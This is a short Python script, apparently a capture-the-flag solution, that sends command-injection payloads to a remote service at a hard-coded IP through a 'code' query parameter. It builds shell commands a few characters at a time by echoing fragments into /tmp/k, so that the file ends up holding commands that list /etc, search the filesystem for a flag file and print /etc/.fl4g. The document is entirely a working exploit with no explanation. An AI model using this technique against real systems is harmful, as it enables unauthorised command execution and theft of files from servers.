import requests
'''
#PAYLOAD to list files
payloads = [
    ';rm /tmp/k',
    ';echo l\>>/tmp/k',
    ';echo s -\>>/tmp/k',
    ';echo la \>>/tmp/k',
    ';echo /et\>>/tmp/k',
    ';echo c\>>/tmp/k'
]

#PAYLOAD to find file
payloads = [
    ';rm /tmp/k',
    ';echo fin\>>/tmp/k',
    ';echo d \>>/tmp/k',
    ';echo / -\>>/tmp/k',
    ';echo nam\>>/tmp/k',
    ';echo e F\>>/tmp/k',
    ';echo l4*\>>/tmp/k',
    #';echo .tx\>>/tmp/k',
    #';echo >>/tmp/k'
]
'''
#PAYLOAD to cat file
#cat etc/.fl4g
payloads = [
    ';rm /tmp/k', #remove file
    ';echo ca\>>/tmp/k',
    ';echo t \>>/tmp/k',
    ';echo /et\>>/tmp/k',
    ';echo c/.\>>/tmp/k',
    ';echo fl4g>>/tmp/k',
]

url = "http://45.122.249.68:8983/?code="

for p in payloads:
    rs = requests.get(url+p)

print("done")
